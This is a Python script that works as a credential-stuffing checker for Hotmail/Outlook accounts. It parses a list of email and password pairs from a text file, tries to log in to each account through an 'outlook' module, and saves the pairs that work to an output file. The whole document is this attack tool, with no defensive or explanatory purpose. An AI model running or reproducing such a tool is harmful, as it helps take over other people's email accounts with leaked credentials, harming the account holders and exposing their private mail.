import outlook
    
def cleanStringDiferentLineUserPass ( stringChain ):
	position = stringChain.find(':') + 1
	stringChain = stringChain[position:]
	stringChain = stringChain.strip()
	return stringChain

def cleanStringSameLineUser ( stringChain ):
	position = stringChain.find(':')
	stringChain = stringChain[:position]
	stringChain = stringChain.strip()
	return stringChain

def cleanStringSameLinePass ( stringChain ):
	position = stringChain.find(':') + 1
	stringChain = stringChain[position:]
	stringChain = stringChain.strip()
	return stringChain

def validateHotmailEmail ( email ):
	if 'hotmail' in email.lower():
		return True
	return False
	
def testConnection ( userName, passw ):
	mail = outlook.Outlook()
	try:
		return mail.loginMine(userName, passw)
	except:
		return False

FILE_EMAIL_CHECKER = 'emails_to_check.txt'
FILE_EMAIL_VALIDATED = 'active_emails.txt'
	
emailPassLines = int(input("Email/Password position? 1 or 2 lines: "))

totalFileLines = sum(1 for line in open(FILE_EMAIL_CHECKER))
actualLine = 0

fileToRead = open(FILE_EMAIL_CHECKER, 'r')
fileToWrite = open(FILE_EMAIL_VALIDATED, 'w')

userName = ''
passw = ''

for line in fileToRead:
	if emailPassLines == 2:
		if 'user' in line.lower():
			userName = cleanStringDiferentLineUserPass(line)
			passw = ''
		if 'pass' in line.lower():
			passw = cleanStringDiferentLineUserPass(line)
	elif emailPassLines == 1:
		userName = cleanStringSameLineUser(line)
		passw = cleanStringSameLinePass(line)

	if validateHotmailEmail ( userName ) == False:
		userName = ''

	if userName != '' and passw != '':
		actualLine += 1
		print ("Read lines: " + str(actualLine) + " / " + str(totalFileLines))
		if testConnection(userName, passw):
			print(userName + ' - ' + passw)
			fileToWrite.write(userName + '\n')
			fileToWrite.write(passw + '\n')
		userName = ''
		passw = ''
		
fileToRead.close()
fileToWrite.close()

print ('File created!')

 
